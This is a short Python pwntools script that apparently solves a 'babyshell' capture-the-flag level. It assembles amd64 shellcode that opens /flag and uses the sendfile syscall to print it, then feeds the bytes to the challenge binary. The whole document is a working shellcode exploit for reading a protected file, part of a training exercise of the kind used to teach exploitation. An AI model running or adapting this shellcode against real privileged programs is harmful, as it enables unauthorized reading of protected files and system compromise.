import pwn
from pwn import *
import os 
pwnlib.context.context.log_level="DEBUG"
pwnlib.context.context.os = 'linux'
pwnlib.context.context.arch = 'amd64'

def get_value(var_name, proc):
    proc.recvuntil("{} = ".format(var_name))
    val = proc.recvuntil("\n").decode("utf-8")
    val.replace(" ", "")
    return val

filename = "/flag"

chall_id = int(os.environ["CHALLENGE_ID"])-216

code_asm = """
    mov ax, 0x2    
    mov r11, 0x67616c662f
    push r11
    push rsp
    pop rdi
    mov esi, 0x0
    syscall

    mov esi, eax
    mov edi, 0x1
    mov edx, 0x0
    mov r10, 0xffffffffffff
    mov eax, 0x28
    syscall

    mov edi, 0x0
    mov eax, 0x3C
    syscall
"""

code_bytes = asm(code_asm)
print(code_bytes)


chall = pwn.process(f"/challenge/babyshell_level{chall_id}")
chall.recvuntil(b'Reading 0x1000 bytes from stdin.\n')
chall.recvline() # newline
chall.send_raw(code_bytes)
chall.recvall()
